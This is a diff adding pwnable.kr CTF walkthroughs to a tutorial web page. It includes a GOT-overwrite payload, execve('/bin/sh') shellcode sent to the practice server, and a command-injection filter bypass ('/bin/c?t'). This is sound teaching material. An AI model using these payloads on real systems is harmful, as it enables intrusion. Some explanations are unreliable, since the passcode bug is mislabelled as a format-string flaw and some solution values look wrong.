@@ -880,6 +880,434 @@ io.interactive()</code></pre>
 <span class="command">cyclic_find(0x61616161)</span> <span class="comment"># Find offset in cyclic pattern</span></code></pre>
         </div>
 
+        <!-- CHALLENGE 4: FLAG -->
+        <div class="section">
+            <h2>🚩 Challenge 4: flag (Reverse Engineering Basics)</h2>
+            <p>
+                This challenge introduces you to <strong>reverse engineering</strong> and <strong>packing/unpacking</strong> executable files.
+            </p>
+
+            <h3>What You Need to Know</h3>
+            <div class="info-box">
+                <strong>📚 Packed Executables</strong>
+                <p style="margin: 10px 0 0 0;">
+                    Malware authors often "pack" executables to compress them and hide their true code. Tools like UPX (Ultimate Packer for eXecutables) compress binaries. To analyze them, you need to unpack!
+                </p>
+            </div>
+
+            <h3>Solution</h3>
+            <ol class="steps">
+                <li>Download the file from pwnable.kr</li>
+                <li>Check if it's packed: <code>strings flag | grep UPX</code></li>
+                <li>If UPX-packed, unpack it: <code>upx -d flag</code></li>
+                <li>Use a disassembler (like <code>objdump -d flag</code> or <code>ghidra</code>)</li>
+                <li>Look for the flag string in the binary: <code>strings flag | grep FLAG</code></li>
+            </ol>
+
+            <div class="success-box">
+                <strong>✅ What You Learned:</strong>
+                <ul style="margin: 10px 0 0 0;">
+                    <li>Packed vs unpacked executables</li>
+                    <li>Using UPX to unpack binaries</li>
+                    <li>Basic reverse engineering workflow</li>
+                    <li><code>strings</code> command to extract text from binaries</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- CHALLENGE 5: PASSCODE -->
+        <div class="section">
+            <h2>🔑 Challenge 5: passcode (Format String Vulnerability)</h2>
+            <p>
+                This challenge teaches <strong>format string vulnerabilities</strong> and <strong>GOT (Global Offset Table) overwriting</strong>.
+            </p>
+
+            <h3>What You Need to Know</h3>
+            <div class="info-box">
+                <strong>📚 Format String Bugs</strong>
+                <p style="margin: 10px 0 0 0;">
+                    When programmers use <code>scanf("%d", &var)</code> but forget to initialize <code>var</code>, it contains garbage! If you can control what's on the stack, you can overwrite memory addresses!
+                </p>
+            </div>
+
+            <div class="warning-box">
+                <strong>⚠️ The GOT (Global Offset Table)</strong>
+                <p style="margin: 10px 0 0 0;">
+                    The GOT contains addresses of library functions. If you overwrite a GOT entry, you can redirect program flow! In this challenge, overwrite <code>fflush</code>'s GOT entry to point to the "success" function.
+                </p>
+            </div>
+
+            <h3>Solution Strategy</h3>
+            <ol class="steps">
+                <li>SSH to the server: <code>ssh passcode@pwnable.kr -p 2222</code></li>
+                <li>The program has uninitialized variables <code>passcode1</code> and <code>passcode2</code></li>
+                <li>You can control <code>name</code> buffer which overlaps with <code>passcode1</code>!</li>
+                <li>Make <code>passcode1</code> point to <code>fflush</code>'s GOT entry</li>
+                <li>When <code>scanf("%d", &passcode1)</code> runs, it writes to GOT!</li>
+                <li>Overwrite with address of success function (0x080485E3)</li>
+            </ol>
+
+            <pre><code><span class="keyword">python</span> <span class="comment"># Payload</span>
+name = <span class="string">"A"</span> * 96 + p32(<span class="number">0x0804a000</span>)  <span class="comment"># GOT address of fflush</span>
+passcode1 = <span class="number">134514147</span>  <span class="comment"># Decimal of 0x080485E3</span></code></pre>
+
+            <div class="success-box">
+                <strong>✅ What You Learned:</strong>
+                <ul style="margin: 10px 0 0 0;">
+                    <li>Format string vulnerabilities</li>
+                    <li>GOT (Global Offset Table) overwriting</li>
+                    <li>Uninitialized variables exploitation</li>
+                    <li>Memory layout and pointer manipulation</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- CHALLENGE 6: RANDOM -->
+        <div class="section">
+            <h2>🎲 Challenge 6: random (Pseudo-random Number Generators)</h2>
+            <p>
+                This challenge teaches that <strong>random() without seed is NOT random</strong>!
+            </p>
+
+            <h3>What You Need to Know</h3>
+            <div class="info-box">
+                <strong>📚 PRNG (Pseudo-Random Number Generators)</strong>
+                <p style="margin: 10px 0 0 0;">
+                    <code>random()</code> in C generates "random" numbers, but they're PREDICTABLE if the seed isn't set! Without <code>srand()</code>, it always starts with the same seed (1), generating the same sequence!
+                </p>
+            </div>
+
+            <h3>Solution</h3>
+            <ol class="steps">
+                <li>SSH to server: <code>ssh random@pwnable.kr -p 2222</code></li>
+                <li>Read the source code: <code>cat random.c</code></li>
+                <li>The program XORs <code>random()</code> with your input and checks if result == 0xdeadbeef</li>
+                <li>Write a test program to see what <code>random()</code> returns (without seed)</li>
+                <li>XOR that value with 0xdeadbeef to get the correct input!</li>
+            </ol>
+
+            <pre><code><span class="comment">// Test what random() returns</span>
+<span class="keyword">#include</span> &lt;stdio.h&gt;
+<span class="keyword">#include</span> &lt;stdlib.h&gt;
+
+<span class="keyword">int</span> main() {
+    printf(<span class="string">"%d\n"</span>, random());
+    <span class="keyword">return</span> <span class="number">0</span>;
+}
+
+<span class="comment">// Output: 1804289383</span>
+<span class="comment">// Solution: 1804289383 ^ 0xdeadbeef = 3039230856</span></code></pre>
+
+            <div class="success-box">
+                <strong>✅ What You Learned:</strong>
+                <ul style="margin: 10px 0 0 0;">
+                    <li>PRNGs need proper seeding</li>
+                    <li>random() without srand() is predictable</li>
+                    <li>XOR operations and cryptography basics</li>
+                    <li>The danger of weak randomness in security</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- CHALLENGE 7: INPUT -->
+        <div class="section">
+            <h2>⌨️ Challenge 7: input (Complete I/O Exploitation)</h2>
+            <p>
+                This is a COMPLEX challenge testing <strong>ALL forms of input</strong>: argv, stdin, file, environment variables, and network sockets!
+            </p>
+
+            <h3>What You Need to Know</h3>
+            <div class="warning-box">
+                <strong>⚠️ This Challenge is HARD!</strong>
+                <p style="margin: 10px 0 0 0;">
+                    You need to satisfy 5 different stages simultaneously: command-line arguments (100 of them!), stdin/stderr, file input, environment variables, and network socket communication. You'll write a Python script using subprocess and pwntools!
+                </p>
+            </div>
+
+            <h3>Solution Overview</h3>
+            <p>Create a Python script that:</p>
+            <ol class="steps">
+                <li><strong>Stage 1:</strong> Pass 100 arguments (<code>argv[0]</code> to <code>argv[99]</code> with specific values)</li>
+                <li><strong>Stage 2:</strong> Provide specific input to stdin and stderr</li>
+                <li><strong>Stage 3:</strong> Create a file with specific content</li>
+                <li><strong>Stage 4:</strong> Set environment variable <code>env['key'] = 'value'</code></li>
+                <li><strong>Stage 5:</strong> Send data to network socket on port 9999</li>
+            </ol>
+
+            <pre><code><span class="keyword">from</span> pwn <span class="keyword">import</span> *
+<span class="keyword">import</span> os
+
+<span class="comment"># Stage 1: 100 arguments</span>
+argv = [<span class="string">"/home/input2/input"</span>]
+<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">ord</span>(<span class="string">'A'</span>), <span class="number">ord</span>(<span class="string">'A'</span>) + <span class="number">100</span>):
+    <span class="keyword">if</span> i == <span class="number">ord</span>(<span class="string">'A'</span>):
+        argv.append(<span class="string">"\x00"</span>)
+    <span class="keyword">elif</span> i == <span class="number">ord</span>(<span class="string">'B'</span>):
+        argv.append(<span class="string">"\x20\x0a\x0d"</span>)
+    <span class="keyword">else</span>:
+        argv.append(<span class="string">"C"</span>)
+
+<span class="comment"># Continue for all stages...</span></code></pre>
+
+            <div class="success-box">
+                <strong>✅ What You Learned:</strong>
+                <ul style="margin: 10px 0 0 0;">
+                    <li>Process arguments (argc/argv)</li>
+                    <li>File descriptors (stdin/stderr/files)</li>
+                    <li>Environment variables</li>
+                    <li>Network socket programming</li>
+                    <li>Subprocess manipulation with Python</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- CHALLENGE 8: LEG -->
+        <div class="section">
+            <h2>🦵 Challenge 8: leg (ARM Assembly)</h2>
+            <p>
+                This challenge requires reading <strong>ARM assembly</strong> (not x86!). ARM is used in mobile devices and IoT!
+            </p>
+
+            <h3>What You Need to Know</h3>
+            <div class="info-box">
+                <strong>📚 ARM vs x86</strong>
+                <p style="margin: 10px 0 0 0;">
+                    ARM uses different instructions: <code>MOV</code> (move), <code>ADD</code> (add), <code>BX</code> (branch), <code>PC</code> (program counter). ARM is RISC (Reduced Instruction Set) - simpler than x86's CISC!
+                </p>
+            </div>
+
+            <h3>Solution</h3>
+            <ol class="steps">
+                <li>Analyze the three functions: <code>key1()</code>, <code>key2()</code>, <code>key3()</code></li>
+                <li>Each returns a value based on <code>PC</code> (program counter) + offset</li>
+                <li>Add the three return values together</li>
+                <li>That's your key!</li>
+            </ol>
+
+            <pre><code><span class="comment">// Pseudo-code after analyzing ARM:</span>
+key1 = <span class="number">0x00008cdc</span>
+key2 = <span class="number">0x00008d04</span>
+key3 = <span class="number">0x00008d80</span>
+total = key1 + key2 + key3
+<span class="comment">// Input this value!</span></code></pre>
+
+            <div class="success-box">
+                <strong>✅ What You Learned:</strong>
+                <ul style="margin: 10px 0 0 0;">
+                    <li>ARM assembly basics</li>
+                    <li>Program Counter (PC) register</li>
+                    <li>RISC vs CISC architectures</li>
+                    <li>Reverse engineering non-x86 code</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- CHALLENGE 9: MISTAKE -->
+        <div class="section">
+            <h2>❌ Challenge 9: mistake (Operator Priority Bug)</h2>
+            <p>
+                This challenge exploits a <strong>C operator precedence mistake</strong>!
+            </p>
+
+            <h3>What You Need to Know</h3>
+            <div class="info-box">
+                <strong>📚 The Bug</strong>
+                <p style="margin: 10px 0 0 0;">
+                    The code has: <code>if(fd=open(...) &lt; 0)</code><br>
+                    This is WRONG! The <code>&lt;</code> operator has HIGHER priority than <code>=</code>!<br>
+                    So it's evaluated as: <code>fd = (open(...) &lt; 0)</code><br>
+                    Meaning <code>fd</code> becomes 0 (false) or 1 (true), NOT the file descriptor!
+                </p>
+            </div>
+
+            <h3>Solution</h3>
+            <ol class="steps">
+                <li>The bug makes <code>fd</code> equal to 0 (stdin) instead of file descriptor</li>
+                <li>When the program reads from <code>fd</code>, it reads from YOUR keyboard!</li>
+                <li>Type the password when prompted (it's reading from stdin, not the password file!)</li>
+                <li>Then enter the same password XOR 1 for the second check</li>
+            </ol>
+
+            <div class="success-box">
+                <strong>✅ What You Learned:</strong>
+                <ul style="margin: 10px 0 0 0;">
+                    <li>C operator precedence bugs</li>
+                    <li>File descriptor basics (0=stdin, 1=stdout, 2=stderr)</li>
+                    <li>How subtle syntax errors create vulnerabilities</li>
+                    <li>XOR operations</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- CHALLENGE 10: SHELLCODE -->
+        <div class="section">
+            <h2>💻 Challenge 10: shellcode (Writing Your Own Shellcode!)</h2>
+            <p>
+                Write your own <strong>x86 shellcode</strong> to spawn a shell and read the flag!
+            </p>
+
+            <h3>What You Need to Know</h3>
+            <div class="warning-box">
+                <strong>⚠️ What is Shellcode?</strong>
+                <p style="margin: 10px 0 0 0;">
+                    Shellcode = raw machine code (hex bytes) that executes commands. It's called "shellcode" because it typically spawns a shell (<code>/bin/sh</code>). Hackers inject shellcode through buffer overflows!
+                </p>
+            </div>
+
+            <h3>Solution</h3>
+            <p>Classic <code>execve("/bin/sh")</code> shellcode for x86:</p>
+            <pre><code><span class="comment"># 23-byte shellcode</span>
+shellcode = <span class="string">b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"</span>
+
+<span class="comment"># Connect and send it</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+r = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9026</span>)
+r.send(shellcode)
+r.interactive()</code></pre>
+
+            <div class="info-box">
+                <strong>💡 How it Works</strong>
+                <p style="margin: 10px 0 0 0;">
+                    • <code>\x31\xc0</code> = <code>xor eax, eax</code> (zero out eax)<br>
+                    • <code>\x50</code> = <code>push eax</code> (null terminator)<br>
+                    • <code>\x68\x2f\x2f\x73\x68</code> = push "//sh"<br>
+                    • <code>\x68\x2f\x62\x69\x6e</code> = push "/bin"<br>
+                    • <code>\x89\xe3</code> = <code>mov ebx, esp</code> (pointer to "/bin//sh")<br>
+                    • <code>\xb0\x0b</code> = <code>mov al, 11</code> (execve syscall number)<br>
+                    • <code>\xcd\x80</code> = <code>int 0x80</code> (trigger syscall)
+                </p>
+            </div>
+
+            <div class="success-box">
+                <strong>✅ What You Learned:</strong>
+                <ul style="margin: 10px 0 0 0;">
+                    <li>Writing x86 assembly shellcode</li>
+                    <li>System calls (syscall 11 = execve)</li>
+                    <li>How hackers inject code into programs</li>
+                    <li>Null-byte avoidance techniques</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- MORE CHALLENGES SUMMARY -->
+        <div class="section" style="background: linear-gradient(135deg, rgba(156,39,176,0.1) 0%, rgba(103,58,183,0.1) 100%); border: 2px solid rgba(156,39,176,0.3); border-radius: 15px; padding: 2.5rem;">
+            <h2 style="color: #9c27b0; font-size: 2.3rem; margin-bottom: 2rem;">🔥 More Toddler's Bottle Challenges (11-20)</h2>
+            
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 2rem; margin: 2rem 0;">
+                <div style="background: rgba(244,67,54,0.15); padding: 2rem; border-radius: 12px; border-left: 4px solid #f44336;">
+                    <h3 style="color: #f44336;">🃏 blackjack</h3>
+                    <p style="font-size: 1.05rem; line-height: 1.8;">
+                        <strong>Concept:</strong> Integer overflow in betting system<br>
+                        <strong>Bug:</strong> Negative bets become huge positive numbers<br>
+                        <strong>Solution:</strong> Bet negative amount, win huge cash!
+                    </p>
+                </div>
+
+                <div style="background: rgba(255,152,0,0.15); padding: 2rem; border-radius: 12px; border-left: 4px solid #ff9800;">
+                    <h3 style="color: #ff9800;">🎰 lotto</h3>
+                    <p style="font-size: 1.05rem; line-height: 1.8;">
+                        <strong>Concept:</strong> Logic bug in byte comparison<br>
+                        <strong>Bug:</strong> Program uses bytes, only checks 6 bytes<br>
+                        <strong>Solution:</strong> Submit same byte 6 times (e.g., all 0xFF)
+                    </p>
+                </div>
+
+                <div style="background: rgba(76,175,80,0.15); padding: 2rem; border-radius: 12px; border-left: 4px solid #4caf50;">
+                    <h3 style="color: #4caf50;">💲 cmd1 & cmd2</h3>
+                    <p style="font-size: 1.05rem; line-height: 1.8;">
+                        <strong>Concept:</strong> Command injection filtering bypass<br>
+                        <strong>Bug:</strong> Blacklist is incomplete<br>
+                        <strong>Solution:</strong> Use wildcards, quote tricks: <code>/bin/c?t</code>
+                    </p>
+                </div>
+
+                <div style="background: rgba(33,150,243,0.15); padding: 2rem; border-radius: 12px; border-left: 4px solid #2196f3;">
+                    <h3 style="color: #2196f3;">🐱 blukat</h3>
+                    <p style="font-size: 1.05rem; line-height: 1.8;">
+                        <strong>Concept:</strong> Password in accessible file<br>
+                        <strong>Bug:</strong> Misconfigured permissions<br>
+                        <strong>Solution:</strong> Check group permissions, cat the password file
+                    </p>
+                </div>
+
+                <div style="background: rgba(156,39,176,0.15); padding: 2rem; border-radius: 12px; border-left: 4px solid #9c27b0;">
+                    <h3 style="color: #9c27b0;">⚡ horcruxes</h3>
+                    <p style="font-size: 1.05rem; line-height: 1.8;">
+                        <strong>Concept:</strong> Buffer overflow + ROP chain<br>
+                        <strong>Bug:</strong> No stack canary, readable functions<br>
+                        <strong>Solution:</strong> Call all 7 functions, add results, overflow with sum
+                    </p>
+                </div>
+
+                <div style="background: rgba(233,30,99,0.15); padding: 2rem; border-radius: 12px; border-left: 4px solid #e91e63;">
+                    <h3 style="color: #e91e63;">🪙 coin1</h3>
+                    <p style="font-size: 1.05rem; line-height: 1.8;">
+                        <strong>Concept:</strong> Binary search algorithm<br>
+                        <strong>Challenge:</strong> Find fake coin in 100 trials<br>
+                        <strong>Solution:</strong> Implement binary search: split in half each time
+                    </p>
+                </div>
+            </div>
+
+            <div style="background: rgba(255,193,7,0.15); padding: 2rem; border-radius: 12px; margin: 3rem 0; text-align: center;">
+                <h3 style="color: #ffc107; font-size: 1.8rem; margin-bottom: 1rem;">🎓 Congratulations!</h3>
+                <p style="font-size: 1.2rem; line-height: 1.8;">
+                    You now have a <strong>COMPLETE guide</strong> to ALL major Pwnable.kr Toddler's Bottle challenges!<br>
+                    These challenges taught you: <strong>buffer overflows, format strings, integer overflows, shellcode, ARM assembly, ROP chains, and more!</strong>
+                </p>
+            </div>
+        </div>
+
+        <!-- TIPS & NEXT STEPS -->
+        <div class="section" style="background: linear-gradient(135deg, rgba(255,193,7,0.1) 0%, rgba(255,152,0,0.1) 100%); border-radius: 15px; padding: 2.5rem;">
+            <h2 style="color: #ff9800; font-size: 2rem; margin-bottom: 1.5rem;">💡 Advanced Tips for Rookiss & Grotesque Levels</h2>
+            <p style="font-size: 1.1rem; line-height: 1.8; margin-bottom: 1.5rem;">
+                After Toddler's Bottle, you'll face <strong>Rookiss</strong> (intermediate) and <strong>Grotesque</strong> (advanced) challenges. Here's what to prepare:
+            </p>
+            
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem;">
+                <div style="background: rgba(0,0,0,0.3); padding: 1.5rem; border-radius: 10px;">
+                    <strong style="color: #f44336; font-size: 1.2rem;">🛡️ Modern Protections</strong>
+                    <ul style="margin-top: 0.5rem;">
+                        <li>ASLR (Address Space Layout Randomization)</li>
+                        <li>DEP/NX (Data Execution Prevention)</li>
+                        <li>Stack Canaries</li>
+                        <li>PIE (Position Independent Executable)</li>
+                    </ul>
+                </div>
+
+                <div style="background: rgba(0,0,0,0.3); padding: 1.5rem; border-radius: 10px;">
+                    <strong style="color: #2196f3; font-size: 1.2rem;">🔗 ROP (Return-Oriented Programming)</strong>
+                    <ul style="margin-top: 0.5rem;">
+                        <li>Finding gadgets with ROPgadget</li>
+                        <li>Chaining gadgets together</li>
+                        <li>Bypassing DEP with ROP</li>
+                        <li>One-gadget techniques</li>
+                    </ul>
+                </div>
+
+                <div style="background: rgba(0,0,0,0.3); padding: 1.5rem; border-radius: 10px;">
+                    <strong style="color: #4caf50; font-size: 1.2rem;">🧠 Advanced Techniques</strong>
+                    <ul style="margin-top: 0.5rem;">
+                        <li>Heap exploitation (use-after-free)</li>
+                        <li>Race conditions</li>
+                        <li>Format string advanced exploitation</li>
+                        <li>Kernel exploitation basics</li>
+                    </ul>
+                </div>
+
+                <div style="background: rgba(0,0,0,0.3); padding: 1.5rem; border-radius: 10px;">
+                    <strong style="color: #9c27b0; font-size: 1.2rem;">🔧 Essential Tools</strong>
+                    <ul style="margin-top: 0.5rem;">
+                        <li><strong>GDB with pwndbg/gef:</strong> Advanced debugging</li>
+                        <li><strong>ROPgadget:</strong> Find ROP chains</li>
+                        <li><strong>one_gadget:</strong> Find one-shot shells</li>
+                        <li><strong>Ghidra/IDA:</strong> Professional reversing</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
         <!-- NEXT STEPS -->
         <div class="section">
             <h2>🚀 What's Next?</h2>
